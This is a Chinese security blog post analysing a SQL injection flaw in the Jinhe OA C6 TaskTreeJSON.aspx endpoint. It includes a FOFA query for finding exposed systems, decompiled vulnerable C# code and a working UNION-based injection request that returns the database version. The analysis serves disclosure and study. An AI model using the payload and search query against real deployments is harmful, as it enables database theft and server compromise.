---
title: "金和OA TaskTreeJSON.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-TaskTreeJSON-id-sqli.html
asset_dir: assets/金和oa-tasktreejson.aspx-sql注入漏洞
---

# 金和OA TaskTreeJSON.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/7 08:26
- 953浏览
- [2评论](#comment)
- 20分钟阅读

深入探索

SQL

安全

服务器

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `TaskTreeJSON.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

先看下

深入探索

网络安全会议

编码转换工具

Docker加速服务

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="TaskTreeJSON.aspx.cs" Inherits="JHSoft.Web.DailyTaskManage.TaskTreeJSON" %>
```

在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `TaskTreeJSON` 的处理逻辑

代码安全审计

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.Session["UserCode"] != null)
    this.strUser = this.Session["UserCode"].ToString();
  this.strParentID = this.Request["id"];
  this.InitTaskTree(this.strParentID);
}

protected void InitTaskTree(string strParentID)
{
  DataTable dataTable = this.dbOperator.ExecSQLReDataTable($"{$" select a.TaskID,a.TaskNumber,a.TaskName,b.UserName as SendName,c.UserName as ExecName,a.TaskProgress,a.TaskFinishFlag,case when exists(select TaskID from TaskManage where TaskFatherID = a.TaskID and TaskIsDel = 0 and TaskFinishFlag = 0) then 1 else 0 end as HasChild,a.TaskRootScale from TaskManage a inner join Users b on a.TaskSendPersonID = b.UserID left join Users c on a.TaskExecutorID = c.UserID where TaskFatherID = '{strParentID}' "} and a.TaskNumber in ( select distinct substring(TaskNumber,0,50) as TaskNumber from TaskManage where (TaskSendPersonID = '{this.strUser}' or (','+TaskExecutorID+',' like '%,{this.strUser},%' or ','+TaskOthersID+',' like '%,{this.strUser},%') or ','+TaskViewRegCode+',' like '%,{this.strUser},%') and TaskFinishFlag <> 2 and TaskIsDel = 0 ) " + " and a.TaskFinishFlag = 0 and a.TaskIsDel = 0 ");
```

深入探索

Web安全书籍

安全研究工具

Web安全课程

参数 `id` 被直接拼接进 `ExecSQLReDataTable` SQL语句中执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /c6/Jhsoft.Web.dailytaskmanage/TaskTreeJSON.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

id='/**/UniOn/**/all/**/SelECt/**/NULL,@@verSion,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

[![金和OA TaskTreeJSON.aspx SQL注入漏洞](images/img-001-675822dfab26.webp)](https://image.mrxn.net/dfd8ae2deef84848af223785b1247e38.webp)

通过联合注入，成功在响应回显数据库版本信息

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
